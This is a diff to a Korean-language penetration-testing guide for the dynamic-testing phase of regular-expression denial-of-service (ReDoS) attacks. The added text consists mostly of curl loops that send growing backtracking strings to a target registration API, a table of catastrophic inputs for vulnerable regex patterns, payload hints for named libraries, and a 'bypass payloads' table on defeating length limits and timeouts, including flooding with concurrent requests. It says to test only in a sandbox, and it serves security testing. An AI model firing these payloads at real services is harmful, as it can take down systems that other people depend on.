@@ -1,83 +1,110 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**기본 페이로드:**
 
-**Step 1: 기준선 측정 (필수)**
-
-정상 요청의 응답 시간을 3회 측정하여 기준선을 확립한다:
-```
-# 기준선 측정 (정상 입력)
-curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
-  -X POST "https://target.com/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"normal@test.com"}'
-# 3회 반복하여 평균 기준선 확인
+**기준선 측정 (필수):**
+```bash
+# 정상 입력 3회 평균
+for i in 1 2 3; do
+  curl -w "%{time_total}\n" -o /dev/null -s -X POST "https://target/api/register" \
+    -H "Content-Type: application/json" -d '{"email":"normal@test.com"}'
+done
 ```
 
-**Step 2: 점진적 길이 증가 테스트**
+**점진적 길이 증가 페이로드 (catastrophic backtracking):**
 
-Phase 1에서 식별한 취약 정규식에 맞는 역추적 유발 문자열을 구성한다:
-- 정규식의 반복 그룹에 매치하는 문자를 반복 + 마지막에 불일치 문자 추가
+phase1에서 식별한 취약 정규식의 반복 그룹에 매치하는 문자 + 마지막에 불일치 문자.
 
-```
-# 길이 10자 — 기준선과 유사해야 함
-curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
-  -X POST "https://target.com/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"aaaaaaaaaa!"}'
-
-# 길이 15자
-curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
-  -X POST "https://target.com/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"aaaaaaaaaaaaaaa!"}'
-
-# 길이 20자
-curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
-  -X POST "https://target.com/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"aaaaaaaaaaaaaaaaaaaa!"}'
-
-# 길이 25자
-curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
-  -X POST "https://target.com/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaa!"}'
-
-# 길이 30자 (25자에서 지연이 보이면)
-curl -w "\ntime_total: %{time_total}\n" -m 30 -o /dev/null -s \
-  -X POST "https://target.com/api/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'
+```bash
+for n in 10 15 20 25 30 35; do
+  pad=$(printf 'a%.0s' $(seq 1 $n))
+  for i in 1 2 3; do
+    curl -w "n=$n try=$i time=%{time_total}\n" -m 30 -o /dev/null -s \
+      -X POST "https://target/api/register" -H "Content-Type: application/json" \
+      -d "{\"email\":\"${pad}!\"}"
+  done
+done
 ```
 
-**Step 3: 결과 분석**
+**정규식 패턴별 catastrophic 입력:**
 
-측정된 응답 시간을 테이블로 정리한다:
+| 취약 패턴 | catastrophic 입력 |
+|---|---|
+| `(a+)+` | `aaaaaaaaaaaaaaaaaaaaa!` |
+| `(a*)*` | `aaaaaaaaaaaaaaaaaaaaa!` |
+| `(a\|ab)+` | `ababababababababababab!` |
+| `(a\|a?)+` | `aaaaaaaaaaaaaaaaaaaaaa!` |
+| `^(.*)*$` | `aaaaaaaaaaaaaaaaaaaa!` |
+| `(\w+)+$` | `aaaaaaaaaaaaaaaaaaaa!` |
+| `(\d+)*\d+` | `1111111111111111111X` |
+| 이메일 (RFC 흉내) | `aaaa@aaaa.aaaa.aaaa.aaaa.aaaa.aa!` |
+| URL | `http://aaaaaaaaaaaaaaaaaa@!` |
+| `(.*?)+` (lazy) | `aaaaaaaaaaaaaaaaaaaa!` |
 
+**Library/version-specific 페이로드:**
+
+| 라이브러리 | 페이로드 |
+|---|---|
+| `path-to-regexp` < 6.x (CVE-2024-45296) | route 자체 ReDoS — 라우트 정의 시점 트리거 |
+| `xml2js` 구버전 | XML attribute 파싱 (특정 형식 attribute) |
+| `validator.js` `isURL`/`isEmail` 일부 버전 | 매우 긴 도메인/email |
+| `markdown-it`/`marked` 구버전 | 특정 문법 (테이블, 링크, 이미지) |
+| `moment.js` 파싱 | 특정 ISO 8601 변형 |
+| `semver` 구버전 | 매우 긴 version 문자열 |
+
+**Time-based 측정 (curl `-m 30`):**
+```bash
+# 타임아웃 30초 — 취약 시 30초까지 매달림
+curl -m 30 -w "%{time_total}\n" -o /dev/null -s "https://target/api/x?input=$(python3 -c 'print("a"*30+"!")')"
 ```
-| 입력 길이 | 시도 1 | 시도 2 | 시도 3 | 평균 |
-|-----------|--------|--------|--------|------|
-| 기준선    | 0.05s  | 0.04s  | 0.05s  | 0.047s |
-| 10자      | 0.05s  | 0.05s  | 0.06s  | 0.053s |
-| 15자      | 0.06s  | 0.07s  | 0.06s  | 0.063s |
-| 20자      | 0.15s  | 0.14s  | 0.16s  | 0.150s |
-| 25자      | 3.2s   | 3.5s   | 3.1s   | 3.267s |  ← 지수적 증가 시작
-| 30자      | 60s+   | ...    | ...    | timeout |
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 페이로드 |
+|---|---|
+| 입력 길이 제한 (256자) | 짧은 입력으로도 catastrophic — `(a+)+` 패턴은 30자에 수 초 |
+| 타임아웃 설정 (10초) | 동시 요청 N개로 서비스 고갈 — 100ms 단축 권장 |
+| 단일 정규식 RE2 이식 | 다른 정규식은 NFA 잔존 — 전체 코드베이스 점검 필요 |
+| `new RegExp(escape(input))` (regex injection 방어) | 긴 literal 자체는 매칭 부담 여전 |
+| Possessive quantifier 일부만 적용 | 다른 부분 취약 잔존 |
+| RE2 + 일부 NFA 혼용 | RE2 이식 안 된 정규식 식별 후 공격 |
+
+**다양한 입력 길이 + 입력 컨텍스트:**
+```
+# JSON body
+{"email":"aaaa...!"}
+
+# Query string
+?email=aaaa...!
+
+# Cookie
+Cookie: filter=aaaa...!
+
+# Header (User-Agent)
+User-Agent: aaaa...!
+
+# Form body
+email=aaaa...!&name=normal
 ```
 
-**판정 기준:**
+---
 
-| 패턴 | 판단 |
-|------|------|
-| 길이 5자 증가마다 응답 시간이 2배 이상 증가 (지수적) | 확인됨 |
-| 25자 이하에서 3초+ 지연 (기준선 대비) | 확인됨 |
-| 모든 길이에서 응답 시간 유사 (선형적 또는 변화 없음) | 안전 |
-| 입력 검증 에러로 조기 반환 (길이 무관) | 안전 (입력 검증이 정규식 전에 동작) |
-| 30자에서만 약간 지연 (1초 미만) | 후보 (실제 DoS 영향은 제한적) |
+**참고사항:**
 
-**타임아웃 설정:**
-- 30자 이상 테스트에는 `-m 30` (30초 타임아웃) 설정
-- 타임아웃 발생 시 ReDoS 확인됨으로 판정
-
-**검증 기준:**
-- **확인됨**: 동적 테스트로 입력 길이 증가에 따라 응답 시간이 지수적으로 증가하는 것을 직접 확인함 (예: 20자 → 0.1초, 25자 → 3초, 30자 → 60초+)
+- Node.js는 단일 스레드 — 1개 ReDoS가 전체 서비스 블로킹 → 영향도 가장 큼
+- Go regexp/Rust regex는 RE2 기반 (선형 시간 보장) — 패턴 매칭 차단
+- .NET `MatchTimeout` 설정 시 패턴 매칭 자체는 가능하나 시간 제한
+- 이메일 정규식이 가장 흔한 취약 패턴 — RFC 5322 흉내가 다수 CVE
+- WAF 자체의 정규식이 ReDoS 게이트가 되는 경우도 있음 (방어 도구가 공격 면)
+- JSON Schema validator의 `pattern` 키에 사용자 schema 허용 시 ReDoS
+- 동적 테스트 시 sandbox 환경에서만 — prod에선 실제 DoS 위험
+- 측정 도중 다른 endpoint 응답 시간도 모니터링 (서비스 전체 블로킹 확인)
+- 길이 5자 증가마다 응답 시간이 2배 이상 증가하면 catastrophic backtracking 확인됨
+- 30초 타임아웃 도달 시 즉시 확인됨 판정 (timeout)
+- 입력 검증 에러로 조기 반환되면 정규식 진입 전 차단 — 안전
+- input length를 Phase 1에서 확인된 검증 한도까지 시도 (256자가 한도면 250자까지)
+- ReDoS 측정은 서비스 영향 큰 작업 — 최소 횟수 (3회)만 시도하고 일관성 확인되면 중단
+- `path-to-regexp` 같은 라우터 ReDoS는 라우트 정의 자체 — 어떤 입력이든 동일 효과
+- WAF 우회: Cloudflare/AWS WAF의 정규식 룰 자체에 ReDoS 시 WAF가 증폭기
